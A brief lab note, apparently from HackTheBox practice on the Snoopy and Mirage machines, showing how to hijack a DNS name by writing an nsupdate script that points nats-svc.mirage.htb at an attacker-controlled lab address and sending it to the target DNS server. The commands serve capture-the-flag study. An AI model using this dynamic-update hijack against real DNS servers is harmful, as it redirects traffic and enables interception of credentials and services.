#dnshijacking #dnsupdate #dnsspoof
Reference: [Hackthebox - Snoopy]([HackTheBox - Snoopy - YouTube](https://www.youtube.com/watch?v=6tn30O0SjVQ&t=1840s)), [Hackthebox - mirage](https://www.google.com/search?q=mirage+htb+walkthrough)
# Create a text file
```
server 10.10.11.78
zone mirage.htb
update add nats-svc.mirage.htb 600 IN A 10.10.16.38
send
```
# Update DNS record
```
nsupdate dns-update.txt
```

